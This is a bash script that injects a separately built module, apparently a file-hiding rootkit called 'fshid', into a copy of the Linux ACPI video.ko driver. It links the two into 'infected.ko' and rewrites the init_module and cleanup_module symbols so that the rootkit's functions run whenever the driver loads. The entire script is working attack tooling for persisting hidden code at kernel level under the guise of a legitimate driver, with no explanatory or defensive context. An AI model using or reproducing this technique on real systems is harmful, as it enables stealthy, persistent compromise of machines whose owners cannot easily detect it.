#!/usr/bin/env bash


name=video.ko


cp /lib/modules/$(uname -r)/kernel/drivers/acpi/${name} . &&
    readelf -s ${name} | grep -e init_module -e cleanup_module -e acpi_video_init -e acpi_video_exit &&
    objcopy ${name} g${name} --globalize-symbol acpi_video_init \
            --globalize-symbol acpi_video_exit &&
    readelf -s g${name} | grep -e init_module -e cleanup_module -e acpi_video_init -e acpi_video_exit &&
    (cd fshid && make --quiet) &&
    ld -r g${name} fshid/fshidko.ko -o infected.ko &&
    readelf -s infected.ko | grep -e init_module -e cleanup_module -e fshid_init -e fshid_exit &&
    setsym infected.ko init_module $(setsym infected.ko fshid_init) &&
    setsym infected.ko cleanup_module $(setsym infected.ko fshid_exit) &&
    readelf -s infected.ko | grep -e init_module -e cleanup_module -e fshid_init -e fshid_exit
